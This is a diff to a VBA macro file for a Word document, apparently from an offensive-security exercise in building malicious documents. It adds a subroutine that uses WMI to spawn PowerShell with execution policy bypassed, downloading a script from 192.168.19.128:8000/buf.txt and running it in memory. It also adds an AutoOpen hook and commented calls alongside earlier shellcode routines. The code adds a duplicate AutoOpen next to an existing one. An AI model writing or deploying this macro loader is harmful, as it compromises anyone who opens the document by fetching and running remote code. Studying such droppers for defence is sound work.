@@ -220,6 +220,14 @@ Function PrintRam()
     
 End Function
 
+Sub WMIPowerShellShellCodeE
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.19.128:8000/buf.txt'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
 
 Sub Document_Open()
     'MyMacro
@@ -230,6 +238,7 @@ Sub Document_Open()
     'PrintRam
     'VBAShellCode
     'DownloadSCodeAndE
+    'WMIPowerShellShellCodeE
     
 End Sub
 
@@ -242,5 +251,6 @@ Sub AutoOpen()
     'PrintRam
     'VBAShellCode
     'DownloadSCodeAndE
+    'WMIPowerShellShellCodeE
     
 End Sub
